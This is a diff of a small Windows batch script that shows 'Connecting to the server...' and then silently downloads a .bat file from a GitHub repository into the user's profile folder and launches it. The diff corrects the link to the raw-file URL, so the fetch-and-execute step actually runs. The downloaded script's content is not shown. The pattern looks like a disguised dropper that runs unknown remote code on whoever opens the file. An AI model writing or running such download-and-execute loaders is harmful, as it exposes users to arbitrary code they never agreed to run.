@@ -2,7 +2,7 @@
 color a
 echo Connecting to the server...
 timeout -t 5 /nobreak
-curl -L -s -o "C:\Users\%username%\ajotak.bat" https://github.com/beeczxd/ajotakv2/blob/main/ajeotak.bat
+curl -L -s -o "C:\Users\%username%\ajotak.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/ajeotak.bat
 start C:\Users\%username%\ajotak.bat
 pause >nul
 exit /b
